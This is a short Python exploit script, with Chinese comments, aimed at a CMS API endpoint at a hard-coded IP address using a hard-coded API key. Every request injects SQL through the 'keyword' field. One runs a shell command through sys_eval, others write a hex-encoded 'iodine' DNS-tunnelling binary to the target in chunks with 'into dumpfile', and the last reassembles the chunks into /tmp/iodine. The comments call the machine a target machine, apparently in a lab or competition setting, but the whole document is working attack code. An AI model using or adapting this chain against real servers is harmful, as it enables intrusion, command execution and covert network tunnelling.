import requests
import uuid

def file_to_hex(file_path):
    with open(file_path, 'rb') as file:
        content = file.read()
    return content.hex()

ip = "39.99.227.73"
url = f"http://{ip}/api/pages/cms/libraryText/list"
header = {
    "X-SS-API-KEY": "e7d41890-5742-48f0-9f3c-1393db541fc7"
}
uid = uuid.uuid4()
# 这里填写本地 iodine 路径
content = file_to_hex("./iodine")
# 这里填写靶机 iodine 路径
path = "/tmp/iodine"

print(len(content))

payload = []
text = []
cnt = 1


for i in range(0,len(content), 5000):
    text.append(str(cnt))
    end = i + 5000
    payload.append(content[i:end])
    cnt += 1


p = dict(zip(text, payload))

# 创建分块传输临时文件夹
data = {
"siteId":1,
"keyword":f"';select sys_eval('mkdir -p /tmp/{uid}');#",
"groupId":0,
"page":1,
"perPage":24
}
requests.post(url, json=data, headers=header)

# print(text)

# 分块传输数据
for t in text:
    data = {
    "siteId":1,
    "keyword":f"';select unhex('{p[t]}') into dumpfile '/tmp/{uid}/{t}.txt'#",
    "groupId":0,
    "page":1,
    "perPage":24
    }
    print(f"正在分段传输第 {t} / {cnt - 1} 段数据")
    r = requests.post(url, json=data, headers=header)

# 将分段传输的数据拼接成完整的文件
load_payload = []
for i in text:
    load_payload.append(f"load_file('/tmp/{uid}/{i}.txt')")
load_payload_2 = ",".join(load_payload)
data = {
"siteId":1,
"keyword":f"';select concat({load_payload_2}) into dumpfile '{path}'#",
"groupId":0,
"page":1,
"perPage":24
}

r = requests.post(url, json=data, headers=header)
# print(r.text)
